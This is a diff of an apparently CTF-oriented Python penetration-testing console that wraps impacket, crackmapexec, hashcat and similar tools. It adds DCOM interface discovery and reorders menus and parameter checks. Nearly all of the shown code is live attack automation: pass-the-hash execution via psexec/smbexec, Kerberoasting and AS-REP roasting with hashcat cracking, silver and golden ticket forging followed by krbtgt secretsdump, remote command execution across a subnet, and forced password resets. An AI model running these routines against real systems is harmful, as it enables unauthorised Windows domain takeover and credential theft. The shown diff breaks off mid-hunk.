@@ -17,6 +17,7 @@
 import os
 import sys
 import time
+import getopt
 import os.path
 import hashlib
 import binascii
@@ -25,6 +26,9 @@ import requests
 import linecache
 
 from termcolor import colored
+from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5.dcomrt import IObjectExporter
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -51,8 +55,10 @@ colour2 = "green"
 colour3 = "white"
 colour4 = "red"
 colour5 = "blue"
+
 network = "tun0"
 workdir = "MASTER"
+
 splashs = 1
 bughunt = 0
 
@@ -307,23 +313,24 @@ def display():
    print('\u2551', end=' ')
    if USER[12][:1] != " ":
       print(colored(USER[11],colour4), end=' ')
+      print(colored(PASS[11],colour4), end=' ')
    else:
       print(colored(USER[11],colour2), end=' ')
-   print(colored(PASS[11],colour2), end=' ')
+      print(colored(PASS[11],colour2), end=' ')
    print('\u2551')  
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
 
 def options():
-   print('\u2551' + "(0) REMOTE IP Scanner  (10) Re/Set SHARE NAME  (20) GetArch (30) Enum4Linux     (40) Kerberos Info  (50) Golden PAC  (60) GenSSHKeyID (70) Hydra POP3 (80) FTP     " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set SERVER TIME (21) NetView (31) WinDap Search  (41) KerbUserFilter (51) Domain Dump (61) GenListUSER (71) Hydra TOM  (81) SSH     " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set WORK AREA   (22) Service (32) Lookup Sids    (42) KerbBruteForce (52) BloodHound  (62) GenListPASS (72) MSF Tomcat (82) SSH ID  " + '\u2551')
-   print('\u2551' + "(3) Re/Set LIVE PORTS  (13) Check Connection   (23) AtExec  (33) SamDump Users  (43) KerbRoasting   (53) BH ACLPwn   (63) Editor USER (73) RemoteSync (83) Telnet  " + '\u2551')
-   print('\u2551' + "(4) Re/Set WEB ADDRESS (14) Recon DNS SERVER   (24) DcomExe (34) REGistryValues (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) RSyncDumpS (84) NetCat  " + '\u2551')
-   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Dump       (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HASH (75) Nikto Scan (85) SQSH    " + '\u2551')
-   print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Rpc Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) GoBuster   (86) MSSQL   " + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) Smb Client     (47) PasstheTicket  (57) SmbExecHASH (67) Hydra FTP   (77) GoPhishing (87) MySQL   " + '\u2551')
-   print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) Hydra SSH   (78) RDeskTop   (88) WinRm   " + '\u2551')
-   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMAP SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Hydra SMB   (79) XDesktop   (89) Exit    " + '\u2551')
+   print('\u2551' + "(0) REMOTE IP Scanner  (10) Re/Set SHARE NAME  (20) GetArch (30) Enum4Linux     (40) Kerberos Info  (50) Golden PAC  (60) GenSSHKeyID (70) Hydra FTP  (80) FTP     " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set SERVER TIME (21) NetView (31) WinDap Search  (41) KerbUserFilter (51) Domain Dump (61) GenListUSER (71) Hydra SSH  (81) SSH     " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set WORK AREA   (22) Service (32) Lookup Sids    (42) KerbBruteForce (52) BloodHound  (62) GenListPASS (72) HYDRA SMB  (82) SSH ID  " + '\u2551')
+   print('\u2551' + "(3) Re/Set LIVE PORTS  (13) Check Connection   (23) AtExec  (33) SamDump Users  (43) KerbRoasting   (53) BH ACLPwn   (63) Editor USER (73) Hydra POP3 (83) Telnet  " + '\u2551')
+   print('\u2551' + "(4) Re/Set WEB ADDRESS (14) Recon DNS SERVER   (24) DcomExe (34) REGistryValues (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) Hydra TOM  (84) NetCat  " + '\u2551')
+   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Dump       (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HASH (75) MSF TOMCAT (85) SQSH    " + '\u2551')
+   print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Rpc Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) RemoteSync (86) MSSQL   " + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) Smb Client     (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL   " + '\u2551')
+   print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm   " + '\u2551')
+   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMAP SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -342,6 +349,7 @@ print("|  \/  |  / \  / ___|_   _| ____|  _ \   / ___/ _ \| \ | / ___| / _ \| | 
 print("| |\/| | / _ \ \___ \ | | |  _| | |_) | | |  | | | |  \| \___ \| | | | |   |  _|  ")
 print("| |  | |/ ___ \ ___) || | | |___|  _ <  | |__| |_| | |\  |___) | |_| | |___| |___ ")
 print("|_|  |_/_/   \_\____/ |_| |_____|_| \_\  \____\___/|_| \_|____/ \___/|_____|_____|")
+print("                                                                                  ")
 print("               BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)               ")
 
 # -------------------------------------------------------------------------------------
@@ -682,7 +690,7 @@ while True:
          if len(TIP) < COL1:
             TIP = padding(TIP, COL1)
          if DOMC == 1:
-            print("\n[+] Resetting current domain association...")
+            print("[+] Resetting current domain association...")
             command("sed -i '$d' /etc/hosts")
             DOM = "EMPTY"
             DOM = padding(DOM, COL1)
@@ -693,13 +701,27 @@ while True:
             print("[+] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
             DOMC = 1
          
-         if":" in TIP:
+         if ":" in TIP:
             print("[*] Defaulting to IP 6...")
             IP46 = "-6"
          else:
             print("[*] Defualting to IP 4...")
             IP46 = "-4"
+            
+         authLevel = RPC_C_AUTHN_LEVEL_NONE
+         stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")
+         rpctransport = transport.DCERPCTransportFactory(stringBinding)
+         portmap = rpctransport.get_dce_rpc()
+         portmap.set_auth_level(authLevel)
+         portmap.connect()
+         objExporter = IObjectExporter(portmap)
+         bindings = objExporter.ServerAlive2()
+         
+         print("[*] Identifying network interfaces...\n")
 
+         for binding in bindings:
+             NetworkAddr = binding['aNetworkAddr']
+             print(colored("Address: " + NetworkAddr, colour2))
          prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1095,13 +1117,13 @@ while True:
 
    if selection =='21':
       CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+      
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+      if DOM[:5] == "EMPTY":
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1120,11 +1142,11 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1142,12 +1164,12 @@ while True:
    if selection == '23':
       CheckParams = 0
 
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+      if DOM[:5] == "EMPTY":
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1165,15 +1187,16 @@ while True:
    if selection == '24':
       CheckParams = 0
 
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
 
-      command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1186,15 +1209,15 @@ while True:
 
    if selection == '25':
       CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         CheckParams = 1
-
+      
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
+      if DOM[:5] == "EMPTY":
+         print("[-] Domain name has not been specified...")
+         CheckParams = 1
+         
       if CheckParams != 1:
          if USR.rstrip(" ") != "Administrator":
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
@@ -1210,13 +1233,13 @@ while True:
 
    if selection == '26':
       CheckParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
       if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1233,13 +1256,13 @@ while True:
 
    if selection == '27':
       CheckParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
       if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1268,7 +1291,10 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '29':
-      ifmap = input("\n[*] Please enter MSRPC interface (ifmap) : ")     
+      ifmap = input("[*] Please enter MSRPC interface (ifmap) : ")    
+      ifmap = ifmap.replace("v",'')
+      ifmap = ifmap .replace(":",'')
+      
       if ifmap != "" and TIP[:5] != "EMPTY":
          command(PATH + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
       prompt()
@@ -1409,11 +1435,11 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1462,11 +1488,11 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1485,11 +1511,11 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1508,11 +1534,11 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1531,37 +1557,41 @@ while True:
       CheckParams = 0
       
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
-
-      if CheckParams != 1:
-         os.remove("shares.txt")
-         command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares.txt")
          
-         command("tput setaf 2")
-         command("cat shares.txt")
-         command("tput sgr0")
+      if PAS != '':
+         if CheckParams != 1:
+            os.remove("shares.txt")
+            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares.txt")
          
-         command("sed -i /'is an IPv6 address'/d shares.txt")	# TIDY UP THE FILE READY FOR READING
-         command("sed -i /Sharename/d shares.txt")
-         command("sed -i /-/d shares.txt")
-         command("sed -i '/^$/d' shares.txt")
+            command("tput setaf 2")
+            command("cat shares.txt")
+            command("tput sgr0")
+         
+            command("sed -i /'is an IPv6 address'/d shares.txt")	# TIDY UP THE FILE READY FOR READING
+            command("sed -i /Sharename/d shares.txt")
+            command("sed -i /-/d shares.txt")
+            command("sed -i '/^$/d' shares.txt")
       
-         count = len(open('shares.txt').readlines( ))                
-         if count > 0:
-            cleanshares()					# PURGE CURRENT SHARE VALUES STORED IN MEMORY
+            count = len(open('shares.txt').readlines( ))                
+            if count > 0:
+               cleanshares()					# PURGE CURRENT SHARE VALUES STORED IN MEMORY
          
-         for x in range(0, count):
-            test = linecache.getline("shares.txt",x + 1).rstrip(" ")
-            if test != '':
-               SHAR[x] = test.lstrip()
-               SHAR[x] = padding(SHAR[x], COL2)			# REPOPULATE SHARE
+            for x in range(0, count):
+               test = linecache.getline("shares.txt",x + 1).rstrip(" ")
+               if test != '':
+                  SHAR[x] = test.lstrip()
+                  SHAR[x] = padding(SHAR[x], COL2)			# REPOPULATE SHARE
             
-            if x == 0:
-               if SHAR[0] == "session setup failed: NT_STATUS_PASSWORD_MUS":
-                  print(colored("[!] Bonus!! It looks like we can change this paricular users password...", colour4))
-                  command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
-                  print("[+] Password has been reset for this user...")
+               if x == 0:
+                  if SHAR[0] == "session setup failed: NT_STATUS_PASSWORD_MUS":
+                     print(colored("[!] Bonus!! It looks like we can change this paricular users password...", colour4))
+                     command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
+                     print("[+] Password has been reset for this user...")
+      else:
+         if NTM != "":
+            command(PATH + "smbclient.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))                    
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1602,9 +1632,9 @@ while True:
    if selection == '39':
       if TIP[:5] != "EMPTY":
          print("")
-         command("\nsmbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+         command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
       else:
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1619,11 +1649,11 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1642,11 +1672,11 @@ while True:
       CheckParams = 0
       
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -1664,11 +1694,13 @@ while True:
                username = username[0]
                if username[:1] != " ":							# CONTAINS DATA
                   command("echo " + username + " >> valid.tmp")				# EXPORT VALID USER
-
-         print("[+] Only the following users are valid...\n")         
-         command("tput setaf 2")
-         command("cat valid.tmp")
-         command("tput sgr0")
+         if os.path.exists("valid.tmp"):
+            print("[+] Only the following users are valid...\n")         
+            command("tput setaf 2")
+            command("cat valid.tmp")
+            command("tput sgr0")
+         else:
+            print("No users where found, check that the domain name is correct...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1745,17 +1777,17 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
             command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
-            print("\n[*] Cracking hash values if they exists...\n")
+            print("[*] Cracking hash values if they exists...\n")
             command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
             command("strings cracked1.txt")
          else:
@@ -1774,17 +1806,17 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
             command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
-            print("\n[*] Cracking hash values if they exists...\n")
+            print("[*] Cracking hash values if they exists...\n")
             command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
             command("strings cracked2.txt")
          else:
@@ -1826,15 +1858,15 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
 
          if PAS[:1] != "\"":
             command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
@@ -1861,7 +1893,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '47':
-      print("\n[*] Sorry, Pass-the-Ticket has not been implemented yet...")
+      print("[*] Sorry, Pass-the-Ticket has not been implemented yet...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1877,27 +1909,27 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
 
          if (NTM[:1] != "") & (SID[:1] != ""):
             command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/" + DOM.rstrip(" ") + " " + USR.rstrip(" "))
             command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
          else:
-            print("\n[-] Hash or Domain-SID not found...")
+            print("[-] Hash or Domain-SID not found...")
 
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
             command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
-             print("\n[-] Silver TGT was not generated...")      
+             print("[-] Silver TGT was not generated...")      
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1913,15 +1945,15 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
 
          if (NTM[:1] != "") & (SID[:1] != ""):
             command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
@@ -1948,15 +1980,15 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
          command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
       prompt()
 
@@ -1972,16 +2004,16 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
          command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
-         print("\n[*] Checking downloaded files: \n")
+         print("[*] Checking downloaded files: \n")
          command("ls -la ./" + DIR.rstrip(" "))
       prompt()
       
@@ -1997,7 +2029,7 @@ while True:
       CheckParams = 0
       
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
       
       if CheckParams != 1:
@@ -2020,20 +2052,20 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         BH1 = input("\n[+] Enter Neo4j username: ")
+         BH1 = input("[+] Enter Neo4j username: ")
          BH2 = input("[+] Enter Neo4j password: ")
          if BH1 != "" and BH2 != "":
             command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s -dry")
          else:
-            print("\n[-] Username or password cannot be null...")
+            print("[-] Username or password cannot be null...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2128,14 +2160,14 @@ while True:
             print("[+] Other exploitable machines on the same subnet...\n")
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
-            print("\n[+] Trying specified windows command...\n")
+            print("[+] Trying specified windows command...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'whoami /all'")
 
-            print("\n[+] Trying to enumerate users and shares...\n")  
+            print("[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
          
-            print("\n[+] Trying a few other command while I am here...\n")
+            print("[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")         
          else:
@@ -2143,14 +2175,14 @@ while True:
             print("[+] Other exploitable machines on the same subnet...\n")
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
-            print("\n[+] Trying specified windows command...\n")
+            print("[+] Trying specified windows command...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'whoami /all'")
 
-            print("\n[+] Trying to enumerate users and shares...\n")  
+            print("[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --users")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --shares")
          
-            print("\n[+] Trying a few other command while I am here...\n")
+            print("[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'net user Administrator /domain'")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -X '$PSVersionTable'")
       prompt()
@@ -2167,15 +2199,15 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
+         print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
          command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -service-name LUALL.exe") 
       prompt()
 
@@ -2191,15 +2223,15 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
+         print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
          command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
       prompt()
 
@@ -2215,15 +2247,15 @@ while True:
       CheckParams = 0
       
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
